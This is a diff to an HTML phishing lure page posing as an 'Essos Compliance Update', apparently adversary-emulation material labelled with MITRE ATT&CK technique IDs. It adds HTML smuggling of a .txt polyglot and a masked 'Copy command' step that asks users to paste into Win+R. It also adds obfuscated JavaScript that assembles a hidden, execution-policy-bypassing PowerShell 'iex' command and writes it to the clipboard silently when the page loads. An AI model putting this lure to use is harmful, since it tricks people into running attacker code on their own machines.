@@ -131,6 +131,34 @@
             white-space: nowrap;
         }
 
+        .cmd-block {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            border-radius: 3px;
+            padding: 10px 14px;
+            margin-top: 10px;
+            font-family: Consolas, 'Courier New', monospace;
+            font-size: 11.5px;
+            letter-spacing: 1px;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+        }
+        .copy-btn {
+            margin-top: 8px;
+            background: #0078d4;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            padding: 7px 16px;
+            font-size: 12.5px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .copy-btn:hover { background: #106ebe; }
+        .copy-btn.copied { background: #107c10; }
+
         .notice {
             font-size: 11.5px;
             color: #a19f9d;
@@ -190,7 +218,7 @@
                 </div>
                 <div class="dl-block">
                     <span class="dl-icon">&#128274;</span>
-                    <span class="dl-name">Essos_Compliance_Update.hta</span>
+                    <span class="dl-name">Essos_Compliance_Update.txt</span>
                     <span class="dl-status">&#10003; Downloaded</span>
                 </div>
             </div>
@@ -201,10 +229,15 @@
             <div class="step-body">
                 <div class="step-title">Apply the compliance policy</div>
                 <div class="step-desc">
-                    Open <strong>Essos_Compliance_Update.hta</strong> from your
-                    <strong>Downloads</strong> folder. If a security prompt appears,
-                    choose <span class="kbd">Open</span> to continue.
+                    Press <span class="kbd">&#8862; Win</span> + <span class="kbd">R</span>,
+                    click <strong>Copy command</strong> below, paste with
+                    <span class="kbd">Ctrl</span> + <span class="kbd">V</span>,
+                    then press <span class="kbd">Enter</span>.
                 </div>
+                <div class="cmd-block" id="cmdDisplay">
+                    &#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;&#x25CF;
+                </div>
+                <button class="copy-btn" id="copyBtn" onclick="copyCommand()">Copy command</button>
             </div>
         </div>
 
@@ -228,22 +261,63 @@
     }
 
     // T1027.006 - HTML Smuggling: the compliance file is reconstructed client-side
-    // from an embedded base64 blob. No HTTP request is issued for the .hta itself,
+    // from an embedded base64 blob. No HTTP request is issued for the .txt itself,
     // so proxy/DLP controls that inspect file downloads by name or MIME type are bypassed.
     function triggerDownload() {
-        var b64 = '@@HTA_B64@@';
+        var b64 = '@@TXT_B64@@';
         var raw = atob(b64);
         var arr = new Uint8Array(raw.length);
         for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
-        var blob = new Blob([arr], {type: 'application/octet-stream'});
+        var blob = new Blob([arr], {type: 'text/plain'});
         var url  = URL.createObjectURL(blob);
         var a = document.createElement('a');
         a.href     = url;
-        a.download = 'Essos_Compliance_Update.hta';
+        a.download = 'Essos_Compliance_Update.txt';
         a.style.display = 'none';
         document.body.appendChild(a);
         a.click();
         setTimeout(function() { document.body.removeChild(a); URL.revokeObjectURL(url); }, 300);
+    }
+
+    // T1027.010 - Command Obfuscation: short launcher; the decode logic lives in the polyglot
+    function buildCommand() {
+        var ps  = ['pow','er','sh','ell'].join('');
+        var sw  = [' -w',' h',' -ep',' byp','ass',' -c'].join('');
+        var pay = ["\"iex(gc -Raw '","%" + "USERPROFILE","%" + "\\Down","loads\\","Essos_","Compli","ance_Up","date.txt",'\')"'].join('');
+        return ps + sw + ' ' + pay;
+    }
+
+    // T1204.004 - Malicious Copy and Paste
+    function copyCommand() {
+        var cmd = buildCommand();
+        var btn = document.getElementById('copyBtn');
+
+        function onSuccess() {
+            btn.textContent = 'Command copied';
+            btn.classList.add('copied');
+            setTimeout(function() {
+                btn.textContent = 'Copy command';
+                btn.classList.remove('copied');
+            }, 3000);
+        }
+
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(cmd).then(onSuccess).catch(function() {
+                fallbackCopy(cmd, onSuccess);
+            });
+        } else {
+            fallbackCopy(cmd, onSuccess);
+        }
+    }
+
+    function fallbackCopy(text, cb) {
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0';
+        document.body.appendChild(ta);
+        ta.focus(); ta.select();
+        try { document.execCommand('copy'); cb(); } catch(e) {}
+        document.body.removeChild(ta);
     }
 
     // T1678 - Delay Execution: fixed wait before the reveal/download
@@ -252,6 +326,10 @@
     function revealPayloadUi() {
         document.getElementById('spinner').style.display = 'none';
         document.getElementById('main').style.display = 'block';
+        var cmd = buildCommand();
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(cmd).catch(function() {});
+        }
         triggerDownload();
     }
 
